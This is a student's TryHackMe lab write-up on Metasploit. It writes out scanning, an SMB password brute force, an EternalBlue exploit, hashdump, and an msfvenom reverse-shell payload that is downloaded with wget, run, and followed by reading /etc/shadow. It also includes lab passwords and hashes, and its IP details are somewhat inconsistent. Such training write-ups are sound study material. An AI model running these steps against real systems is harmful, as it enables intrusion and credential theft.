# [Exploitation Basics]

**TryHackMe Path**: [Cyber Security 101]  
**Lab Topic**: [Metasploit: Exploitation]  
**Date Completed**: [09/03/2025]

---

## ðŸ§  Summary

> In this lab, I learned about the importance of understanding why you should use Metasploit to scan target systems, which is that it teaches you how attackers gather intel, ties directly into exploitation, and
strengthens your ability to detect and defend against intrusions in real-world SOC environments. Next, I learned the importance of understanding why you should use the Metasploit database feature, which is that
it makes reconnaissance and exploitation structured, efficient, repeatable, and report-friendly. It mirrors how attackers build organized attack paths, which in turn sharpens your ability to defend against them.
I then learned the importance of understanding why you should use Metasploit to conduct a vulnerability scan, which is that it teaches you how attackers map weaknesses, ties recon directly to exploitation, and
helps you as a defender to detect, prioritize, and remediate vulnerabilities more effectively. Following, I learned the importance of understanding why you should use Metasploit to exploit vulnerable services on
target systems, which is that it transforms vulnerabilities from abstract risks into practical threats, sharpens your technical skills, and gives you the attacker's perspective - which is precisely what you need to
defend effectively. Finally, I learned the importance of understanding how msfvenom can be used to create payloads and obtain a Meterpreter session on the target system, which is because msfvenom teaches you how
attackers generate custom malware, and Meterpreter shows you what they can do once inside. That knowledge helps you build stronger defenses, detect compromises faster, and think like an attacker.

---

## ðŸŽ¯ Objectives
- [ ] Learn how to scan target systems using Metasploit
- [ ] Learn how to use the Metasploit database feature
- [ ] Learn how to use Metasploit to conduct a vulnerability scan
- [ ] Learn how to use Metasploit to exploit vulnerable services on target systems
- [ ] Learn how msfvenom can be used to create payloads and obtain a Metepreter session on the target system 
      
---

## ðŸ§° Tools Used
- THM AttackBox
- THM Metasploit
- THM Metepreter
- THM Msfvenom
 
---


## ðŸ“Š Analysis & Screenshots

*** Scanning Practicals ***

> After launching the THM AttackBox, I then ran Metasploit by inputting "msfconsole," then "enter," and was given my first practical, which was to find out how many open ports they were on the target system. To do
this, I input "nmap -sS 10.10.96.65," then "enter." I used the nmap command because it is faster to conduct scans on a target system within Metasploit.

> <img width="600" height="296" alt="meta8" src="https://github.com/user-attachments/assets/b4ecfa0d-657e-4fdd-9154-a78845602e33" />

> I then had to figure the NETBIOS name by using the relevant scanner. To do this
>

> I then had to figure out what was running on port 8000. To do this, I input the command "nmap -sV 10.10.183.249," then "enter," which displayed "webfs/1.21" on port 8000.

> <img width="914" height="334" alt="meta9" src="https://github.com/user-attachments/assets/02987001-465d-42a0-9d16-895b7f101f06" />

> Next, I had to figure out the "penny" user's SMB password. To do this, I had to implement the wordlist that was mentioned in the previous task and then switch to the "smb_login" module by inputting the command
"search smb_login," then "enter," then "use 0."

> <img width="1080" height="902" alt="meta10" src="https://github.com/user-attachments/assets/75e6bb85-bfdb-4f4b-8598-d5f638d0c7b7" />

> I then had to set the RHOSTS to the target machine's IP address by inputting "set RHOSTS 10.10.135.248," then "enter."

> <img width="608" height="75" alt="meta11" src="https://github.com/user-attachments/assets/d1033556-3120-4de8-8db5-3f8ee3653407" />

> Then, I had to set the pass_file module to the wordlist given in the previous task by inputting "set pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt," then "enter," then "show options" to make
sure it was set correctly.

> <img width="1086" height="805" alt="meta12" src="https://github.com/user-attachments/assets/01842bc7-0afe-49dd-bd7e-f39295eaec39" />

> Next, I had to set smbuser to "penny" by entering "set smbuser penny," followed by "enter," and then "show options" to confirm the setting.

> <img width="1085" height="800" alt="meta13" src="https://github.com/user-attachments/assets/46460c81-0fa8-4b47-bdb9-9a035b29484a" />

> Finally, I had to run the smb_login module to retrieve the "penny" user's password by inputting "run," then "enter," and got the password "leo1234."

> <img width="1028" height="255" alt="meta14" src="https://github.com/user-attachments/assets/f8f22056-a6a3-4a1e-af4c-6a00f541aae9" />

*** Vulnerability Scanning ***

> I was then given a practical to find out who wrote the module that allows us to check SMTP servers for open relay. To do this, I input "search smtp," then "enter," and was given a list of modules that fell under
"smtp."

> <img width="486" height="84" alt="meta15" src="https://github.com/user-attachments/assets/2950cf03-7edc-4ad1-9603-c51e1828583f" />

> I then found the specific module that allows us to check the SMTP servers for open relay, which was module 39.

> <img width="461" height="73" alt="meta16" src="https://github.com/user-attachments/assets/9de68cbd-199b-426d-a735-10159d62b7cf" />

> To figure out who wrote the module, I input "use 39," then "enter," and saw it was written by "Campbell Murray."

> <img width="569" height="218" alt="meta17" src="https://github.com/user-attachments/assets/e3abfd4b-80d9-4869-8d12-c2c54daa8b15" />

*** Exploitation ***

> Given a practical to exploit one of the critical vulnerabilities on the target VM. To do this, I had to first switch to the module "windows/smb/ms17_010_eternalblue" by inputting
"use windows/smb/ms17_010_eternalblue," then "enter," which ended up just defaulting to "windows/x64/meterpreter/reverse_tcp" because no payload was configured.

>  <img width="775" height="41" alt="meta18" src="https://github.com/user-attachments/assets/273808eb-46ab-4883-8888-d41f888cd719" />

> I then had to set the RHOSTS to the target VM's IP address by inputting "set RHOSTS 10.201.58.191," then "enter."

> <img width="690" height="58" alt="meta19" src="https://github.com/user-attachments/assets/5bfe23bb-5eba-43cb-a75e-15154aef155d" />

> Then I finally input "run" to exploit the critical vulnerability on the target VM, and it was confirmed that the host was vulnerable to MS17-010.

> <img width="1165" height="552" alt="meta20" src="https://github.com/user-attachments/assets/c6f4133e-1397-41bd-a213-06402abca5ce" />

> The next practical was to figure out the contents of the flag.txt file, which was located in the directory "C:\Users\Jon\Documents." To do this, I had to background the metepreter session #1 by inputting the
"background" command, then "enter."

> <img width="1158" height="192" alt="meta21" src="https://github.com/user-attachments/assets/83612258-01ca-4dd8-8ef1-c606cfe9459e" />

> I then had to interact with the session in the background by inputting "session -i 1," then "cd /" to change the directory to the "C:\" directory.

> <img width="705" height="73" alt="meta22" src="https://github.com/user-attachments/assets/55f32986-1342-4e9f-a5dd-293d734261b9" />

> Then, to find the "flag.txt" file within the "C:\" directory, I input "search -f flag.txt," then "enter," and confirmed that it was explicitly located in "C:\Users\Jon\Documents\" directory.

> <img width="695" height="163" alt="meta23" src="https://github.com/user-attachments/assets/76ea880e-7581-4abc-a45f-542d95aa527d" />

> To display the contents of the "flag.txt" file, I entered "cat /Users/Jon/Documents/flag.txt" and then pressed "enter," retrieving "THM-5455554845."

> <img width="502" height="54" alt="meta24" src="https://github.com/user-attachments/assets/2a094186-5dc8-4b04-8246-e0cc48572c23" />

> Next, I was given a practical to find the NTML hash of the password of the user "pirate." To do this, I stayed within Meterpreter and inputted the command "hashdump," then "enter." This then listed all the
hashes for all the users on the system. I then saw "pirate" user's NTML hash, which was "8ce9a3ebd1647fcc5e04025019f4b875."

>  <img width="819" height="112" alt="meta25" src="https://github.com/user-attachments/assets/331e0f8a-8cc8-4d02-9eef-08375df30ce4" />

*** Msfvenom ***

> Moving on, I was given a practical to exploit a target machine using msfvenom. First, I had to launch my target machine, then sign in using SSH with the username: "murphy," and the password: "1q2w3e4r."

> <img width="709" height="138" alt="meta26" src="https://github.com/user-attachments/assets/fd7687c3-9749-4004-9f50-074fe5e6b28e" />

> I then had to create a Meterpreter payload in the .elf format on my AttackBox attacking machine. I did this by using the command
"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.201.61.134 LPORT=4444 -f elf > shell.elf," then "enter," after the command loaded i inputted "ls" to confirm that my shell.elf payload was created.
I then input the command "chmod 777 shell.elf," followed by "enter," to grant the payload permissions for anyone to access. Next, I use "ls" to confirm that the permissions were successfully granted.

> <img width="1216" height="197" alt="meta27" src="https://github.com/user-attachments/assets/3112d596-08dc-42f2-8227-bf0edb56dec3" />
> <img width="1255" height="57" alt="meta28" src="https://github.com/user-attachments/assets/37932732-520f-4b19-8c13-d2ef00eb6cd7" />

> So I then had to transfer the shell.elf payload to my target machine "10.201.60.74." To do this, I input the command "python3 -m http.server 9000," then "enter." This will host all of my files on the internet
using Python, so I can grab my files and transfer them to the target machine.
> I then went over to my target machine to grab the files. To do this, I input the command "wget http://10.201.60.74:9000/shell.elf," then "enter," which then downloaded the files that were hosted on the Python
server onto my target machine.
> After downloading the files, I gave them all access permissions by entering the command "chmod 777 shell.elf," followed by "enter," and then "ls" to confirm the granted permissions.

> <img width="584" height="85" alt="meta29" src="https://github.com/user-attachments/assets/d82bc49e-8adb-4178-8da5-3ec37df4992e" />
> <img width="1034" height="267" alt="meta30" src="https://github.com/user-attachments/assets/e60fe996-b88b-4458-b16d-127e0cbce633" />
> <img width="1055" height="84" alt="meta31" src="https://github.com/user-attachments/assets/8ed94487-7439-47a0-8f72-34b04fb1cd9a" />

> Next, I had to set up a payload handler on my attacking machine. To do this, I had to get into Metasploit by inputting the command "msfconsole," then "enter," then "search multi/handler" to search for the payload
handler.

> <img width="1532" height="399" alt="meta32" src="https://github.com/user-attachments/assets/3b57b13f-046d-4d64-b051-5a60aece745a" />

> I then input the command "use 7" and press "enter" because that was the handler to use. Then had to set up the listening host as my attacking machine, which was "10.201.60.74" by inputting the command
"set LHOST 10.201.60.74," then "enter."

> I then input the command "show options" to confirm that both the LHOST and LPORT were configured, and it was.

> <img width="502" height="43" alt="meta33" src="https://github.com/user-attachments/assets/c3589eef-f578-46f0-b450-57d8528ac443" />
> <img width="805" height="356" alt="meta34" src="https://github.com/user-attachments/assets/ba67eda9-5c8b-4c05-a0fb-dcf45fee565c" />

> Since the payload handler on the attacking machine is set to generic reverse_tcp by default, I had to match that payload handler to the msfvenom payload. To do this, I input the command
"set payload linux/x86/meterpreter/reverse_tcp" on my attacking machine, then "enter," then "run" to start the TCP handler.

> <img width="754" height="44" alt="meta35" src="https://github.com/user-attachments/assets/adc5eefa-4195-4b4e-9bc3-895b5fcc082a" />
> <img width="528" height="45" alt="meta36" src="https://github.com/user-attachments/assets/df0d3e7f-e4d4-4591-a430-5a8546da079b" />


> While the TCP handler was waiting for a connection from the target machine, I returned to the target machine and entered "./shell.elf," followed by "enter" to initiate the connection to the attacking machine.
After the connection was sent over to the attacking machine and the metepreter shell was made. I went back to the attacking machine and inputted "ls," then "enter" to confirm that the "shell.elf" payload
was there.

> <img width="983" height="722" alt="meta37" src="https://github.com/user-attachments/assets/f635bcd9-6701-40c7-b774-383e23f7ee90" />

> I then had to use a post-exploitation module to dump the hashes of other users on the system. To do this, I stayed in my Meterpreter shell, then used the command "cd etc" to get into the etc folder, then "ls" to
list the contents of the etc folder.

> <img width="623" height="89" alt="meta38" src="https://github.com/user-attachments/assets/1a3ef314-0777-4583-9875-b14164c96c3b" />

> I then input the command "cat shadow" and press "enter" to retrieve the hashes of the other users on the attacking machine.

> <img width="1154" height="708" alt="meta39" src="https://github.com/user-attachments/assets/9584a129-5870-4bc4-8541-faa946d8f163" />

---

## Reflection

> This lab provided me with knowledge about using Metasploit for scanning, vulnerability assessment, and exploitation. The most challenging part of the lab was the section where I had to use msfvenom. 
